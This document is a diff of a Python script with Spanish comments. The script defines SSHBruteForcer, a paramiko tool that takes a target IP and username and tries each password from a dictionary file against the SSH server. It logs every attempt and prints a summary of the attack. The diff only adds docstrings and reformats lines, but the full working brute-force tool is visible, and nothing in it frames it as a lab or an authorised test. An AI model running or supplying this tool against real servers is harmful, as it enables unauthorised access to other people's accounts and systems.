@@ -2,21 +2,42 @@ import paramiko
 import time
 import datetime
 
+
 class SSHBruteForcer:
+    """
+    Clase que realiza un ataque de fuerza bruta sobre un servidor SSH
+    utilizando un diccionario de contraseñas.
+    """
+
     def __init__(self, host, port, username, diccionario_path):
+        """
+        Inicializa el objeto con los parámetros de conexión.
+        """
         self.host = host
         self.port = port
         self.username = username
         self.diccionario_path = diccionario_path
         self.resultado = None
         self.intentos = []
-        self.log_file = f"ssh_brute_log_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+        self.log_file = (
+            f"ssh_brute_log_"
+            f"{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+        )
 
     def intentar_login(self, password):
+        """
+        Intenta conectarse al servidor SSH con una contraseña dada.
+        """
         client = paramiko.SSHClient()
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         try:
-            client.connect(self.host, port=self.port, username=self.username, password=password, timeout=5)
+            client.connect(
+                self.host,
+                port=self.port,
+                username=self.username,
+                password=password,
+                timeout=5
+            )
             client.close()
             return True
         except paramiko.AuthenticationException:
@@ -30,13 +51,24 @@ class SSHBruteForcer:
             return False
 
     def registrar_intento(self, password, exito):
+        """
+        Registra el resultado de un intento de conexión.
+        """
         estado = "EXITO" if exito else "FALLIDO"
         self.intentos.append((password, estado))
         with open(self.log_file, "a") as f:
             f.write(f"Intento con '{password}': {estado}\n")
 
     def fuerza_bruta(self):
-        with open(self.diccionario_path, 'r', encoding='utf-8', errors='ignore') as diccionario:
+        """
+        Ejecuta el ataque de fuerza bruta usando el diccionario.
+        """
+        with open(
+            self.diccionario_path,
+            'r',
+            encoding='utf-8',
+            errors='ignore'
+        ) as diccionario:
             for linea in diccionario:
                 password = linea.strip()
                 print(f"[~] Probando contraseña: {password}")
@@ -52,6 +84,9 @@ class SSHBruteForcer:
             print("[!] No se encontró una contraseña válida.")
 
     def resumen(self):
+        """
+        Muestra un resumen de los intentos realizados.
+        """
         print("\n===== RESUMEN DEL ATAQUE =====")
         for intento in self.intentos:
             print(f"Contraseña: {intento[0]} - Resultado: {intento[1]}")
@@ -60,11 +95,17 @@ class SSHBruteForcer:
         else:
             print("\n[!] No se detectó ninguna contraseña débil.")
 
+
 if __name__ == "__main__":
     host = input("[*] IP del servidor SSH: ")
     username = input("[*] Usuario a atacar: ")
     diccionario_path = input("[*] Ruta del diccionario de contraseñas: ")
 
-    atacante = SSHBruteForcer(host, port=22, username=username, diccionario_path=diccionario_path)
+    atacante = SSHBruteForcer(
+        host,
+        port=22,
+        username=username,
+        diccionario_path=diccionario_path
+    )
     atacante.fuerza_bruta()
     atacante.resumen()
